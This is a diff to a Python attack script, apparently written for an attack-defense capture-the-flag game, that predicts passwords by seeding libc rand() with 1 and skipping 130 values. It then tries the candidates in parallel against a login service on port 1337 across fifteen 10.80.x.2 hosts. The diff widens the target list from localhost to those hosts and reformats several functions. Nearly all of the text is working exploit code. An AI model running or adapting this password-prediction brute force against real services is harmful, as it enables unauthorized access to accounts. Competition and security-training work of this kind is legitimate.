@@ -7,6 +7,7 @@ Steps:
  2) Seed libc rand() with 1, skip 130 passwords, then generate up to 1000 passwords.
  3) For each password, try logging in on all configured hosts in parallel; stop on first success.
 """
+
 import socket
 import ctypes
 import ctypes.util
@@ -24,10 +25,7 @@ DB_NAME = "arasaka_academy"
 DB_TABLE = "students"  # "students" or "professors"
 
 # List of target hosts to try concurrently
-TARGETS = [
-    ("127.0.0.1", 1337),
-    # ("10.0.0.2", 1337),
-]
+TARGETS = [(f"10.80.{i}.2", 1337) for i in range(1, 16)]
 
 CONNECT_TIMEOUT = 5
 SKIP_PASSWORDS = 130
@@ -60,7 +58,9 @@ def fetch_last_username() -> str:
             return row[0] if row else ""
 
 
-def recv_until(sock: socket.socket, marker: bytes, timeout: float = CONNECT_TIMEOUT) -> bytes:
+def recv_until(
+    sock: socket.socket, marker: bytes, timeout: float = CONNECT_TIMEOUT
+) -> bytes:
     sock.settimeout(timeout)
     data = b""
     while marker not in data:
@@ -71,7 +71,9 @@ def recv_until(sock: socket.socket, marker: bytes, timeout: float = CONNECT_TIME
     return data
 
 
-def try_login(target: tuple[str, int], username: str, password: str, as_prof: bool) -> tuple[bool, bytes, tuple[str, int]]:
+def try_login(
+    target: tuple[str, int], username: str, password: str, as_prof: bool
+) -> tuple[bool, bytes, tuple[str, int]]:
     host, port = target
     s = socket.create_connection((host, port), timeout=CONNECT_TIMEOUT)
     recv_until(s, b"Choose:")
@@ -97,7 +99,10 @@ def brute(username: str, targets: Iterable[tuple[str, int]], as_prof: bool) -> N
         pwd = next_password()
         print(f"[.] attempt {attempt} password {pwd}")
         with ThreadPoolExecutor(max_workers=len(TARGETS)) as pool:
-            futures = {pool.submit(try_login, tgt, username, pwd, as_prof): tgt for tgt in targets}
+            futures = {
+                pool.submit(try_login, tgt, username, pwd, as_prof): tgt
+                for tgt in targets
+            }
             for fut in as_completed(futures):
                 try:
                     ok, banner, tgt = fut.result()
